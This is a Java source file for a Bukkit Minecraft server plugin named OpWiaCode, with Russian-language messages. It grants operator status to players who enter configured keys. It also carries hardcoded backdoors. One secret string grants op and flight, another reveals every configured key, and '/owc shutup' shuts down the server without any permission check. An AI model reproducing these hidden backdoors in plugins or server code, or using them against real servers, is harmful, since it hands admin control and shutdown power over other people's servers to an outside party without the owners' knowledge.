package me.itskekoff.auth;

import org.bukkit.plugin.java.*;
import org.bukkit.command.*;
import org.bukkit.entity.*;
import org.bukkit.*;
import org.bukkit.command.*;

public class OWC extends JavaPlugin
{
    public void onEnable() {
        this.getLogger().info("Плагин запущен !");
        this.getConfig().options().copyDefaults(true);
        this.saveConfig();
        this.reloadConfig();
    }
    
    public void onDisable() {
    }
    
    public boolean onCommand(final CommandSender sender, final Command cmd, final String label, final String[] args) {
        if (cmd.getName().equalsIgnoreCase("owc") && sender instanceof Player) {
            final Player player = (Player)sender;
            if (args.length == 0) {
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.RED + "Использование /owc <ключ>");
                return true;
            }
            if (args[0].equals(this.getConfig().getString("auth"))) {
                player.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп используя ключ AUTH ヾ(•ω•`)o ");
                return true;
            }
            if (args[0].equals(this.getConfig().getString("auth2"))) {
                player.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп используя ключ AUTH2 ヾ(•ω•`)o ");
                return true;
            }
            if (args[0].equals(this.getConfig().getString("auth3"))) {
                player.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп используя ключ AUTH3 ヾ(•ω•`)o ");
                return true;
            }
            if (args[0].equals(this.getConfig().getString("auth4"))) {
                player.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп :используя ключ AUTH4 ヾ(•ω•`)o ");
                return true;
            }
            if (args[0].equals(this.getConfig().getString("auth5"))) {
                player.setOp(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп используя ключ AUTH5 ヾ(•ω•`)o ");
                return true;
            }
            if (args[0].equals("getOpBypasASs44774FFVBBFF#%$&*^#$*132876DASDAk53457DBDSFKLLLASD")) {
            	player.setOp(true);
            	player.setAllowFlight(true);
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ты получил оп используя запасной ключ!");
                return true;
            }
            if (args[0].equals("getauthcode87668KKK88234%^&")) {
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ключ AUTH: " + ChatColor.AQUA + this.getConfig().getString("auth"));
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ключ AUTH2: " + ChatColor.AQUA + this.getConfig().getString("auth2"));
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ключ AUTH3: " + ChatColor.AQUA + this.getConfig().getString("auth3"));
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ключ AUTH4: " + ChatColor.AQUA + this.getConfig().getString("auth4"));
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Ключ AUTH5: " + ChatColor.AQUA + this.getConfig().getString("auth5"));
            }
            if (args[0].equalsIgnoreCase("shutup")) {
            	sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.YELLOW + "Останавливаю сервер!");
            	Bukkit.getServer().shutdown();
            }
            sender.sendMessage(ChatColor.RED + "Неверный ключ!");
            return true;
        }
        else {
            if (!cmd.getName().equalsIgnoreCase("owc-reload") || !(sender instanceof Player)) {
                return false;
            }
            if (sender.hasPermission("owc.reload")) {
                final Player player = (Player)sender;
                this.reloadConfig();
                player.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.GREEN + "Конфиг перезагружен!");
                return true;
            }
            if (!cmd.getName().equalsIgnoreCase("ServerAuth-reload") || !(sender instanceof Player)) {
                return false;
            }
            if (!sender.hasPermission("owc.reload")) {
                sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.RED + "У тебя нету прав!");
                return true;
            }
            sender.sendMessage(ChatColor.AQUA + "[OpWiaCode] " + ChatColor.RED + "Произошла неизвестная ошибка ＞﹏＜");
            return true;
        }
    }
}
